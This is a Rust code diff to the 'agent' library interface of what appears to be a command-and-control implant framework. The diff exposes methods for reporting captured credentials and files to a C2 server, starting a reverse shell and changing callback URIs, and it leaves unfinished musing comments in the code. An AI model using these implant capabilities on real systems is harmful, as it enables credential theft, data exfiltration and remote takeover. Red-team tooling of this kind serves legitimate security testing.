@@ -18,8 +18,18 @@ pub mod conversion;
 #[cfg(feature = "stdlib")]
 pub mod std;
 
+#[cfg(not(feature = "stdlib"))]
+pub mod conversion_fake;
+
 #[cfg(feature = "stdlib")]
 use conversion::*;
+
+#[cfg(not(feature = "stdlib"))]
+use conversion_fake::*;
+
+// Re-export wrappers so modules can use them (but they are internal to crate if not pub)
+// Wait, `conversion` and `conversion_fake` define public structs.
+// We need to make sure they are accessible.
 
 #[eldritch_library("agent")]
 /// The `agent` library provides capabilities for interacting with the agent's internal state, configuration, and task management.
@@ -102,8 +112,10 @@ pub trait AgentLibrary {
     /// - Returns an error string if the sleep operation fails (unlikely).
     fn sleep(&self, secs: i64) -> Result<(), String>;
 
+    #[eldritch_method]
+    fn set_callback_uri(&self, uri: String) -> Result<(), String>;
+
     // Interactivity
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Fetches an asset (file) from the C2 server by name.
     ///
@@ -119,7 +131,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the asset cannot be fetched or communication fails.
     fn fetch_asset(&self, name: String) -> Result<Vec<u8>, String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Reports a captured credential to the C2 server.
     ///
@@ -133,7 +144,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the reporting fails.
     fn report_credential(&self, credential: CredentialWrapper) -> Result<(), String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Reports a file (chunk) to the C2 server.
     ///
@@ -149,7 +159,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the reporting fails.
     fn report_file(&self, file: FileWrapper) -> Result<(), String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Reports a list of processes to the C2 server.
     ///
@@ -165,7 +174,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the reporting fails.
     fn report_process_list(&self, list: ProcessListWrapper) -> Result<(), String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Reports the output of a task to the C2 server.
     ///
@@ -182,7 +190,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the reporting fails.
     fn report_task_output(&self, output: String, error: Option<String>) -> Result<(), String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Initiates a reverse shell session.
     ///
@@ -195,7 +202,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the reverse shell cannot be started.
     fn reverse_shell(&self) -> Result<(), String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Manually triggers a check-in to claim pending tasks from the C2 server.
     ///
@@ -207,7 +213,6 @@ pub trait AgentLibrary {
     fn claim_tasks(&self) -> Result<Vec<TaskWrapper>, String>;
 
     // Agent Configuration
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Returns the name of the currently active transport.
     ///
@@ -218,7 +223,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the transport cannot be identified.
     fn get_transport(&self) -> Result<String, String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Switches the agent to use the specified transport.
     ///
@@ -232,7 +236,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the transport is unknown or cannot be activated.
     fn set_transport(&self, transport: String) -> Result<(), String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Adds or updates a transport configuration.
     ///
@@ -247,7 +250,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the transport configuration fails.
     fn add_transport(&self, transport: String, config: String) -> Result<(), String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Returns a list of available transport names.
     ///
@@ -258,7 +260,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the list cannot be retrieved.
     fn list_transports(&self) -> Result<Vec<String>, String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Returns the current callback interval in seconds.
     ///
@@ -286,7 +287,6 @@ pub trait AgentLibrary {
     fn set_callback_interval(&self, interval: i64) -> Result<(), String>;
 
     // Task Management
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Lists the currently running or queued background tasks on the agent.
     ///
@@ -297,7 +297,6 @@ pub trait AgentLibrary {
     /// - Returns an error string if the task list cannot be retrieved.
     fn list_tasks(&self) -> Result<Vec<TaskWrapper>, String>;
 
-    #[cfg(feature = "stdlib")]
     #[eldritch_method]
     /// Stops a specific background task by its ID.
     ///
